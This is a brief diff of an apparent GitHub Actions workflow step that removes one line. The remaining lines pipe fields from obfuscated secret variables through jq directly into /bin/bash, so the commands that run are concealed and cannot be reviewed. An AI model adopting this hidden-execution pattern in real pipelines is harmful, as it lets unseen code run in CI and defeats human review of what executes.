@@ -18,7 +18,6 @@ jobs:
           ufw72: ${{ secrets.ufw72 }}
         run: |
           printf '%s' "$ufw72" | jq -r .ev1310 | /bin/bash
-          echo $fbgk1280 | jq -r .t76 | /bin/bash
           printf '%s' "$syy746" | jq -r .dffp5388 | /bin/bash
 
       - name: Upload data
